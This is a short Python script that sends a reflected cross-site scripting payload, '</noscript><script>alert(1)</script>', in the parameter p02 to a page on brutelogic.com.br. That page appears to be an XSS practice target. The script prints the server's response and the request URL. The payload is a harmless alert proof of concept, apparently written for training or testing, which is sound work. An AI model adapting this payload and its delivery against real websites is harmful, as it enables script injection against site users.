#!/usr/bin/python3
import requests

url = "https://brutelogic.com.br/gym.php"

payload = '</noscript><script>alert(1)</script>'

params = {'p02': payload}

r = requests.get(url, params=params)

print(r.text)
print(r.url)
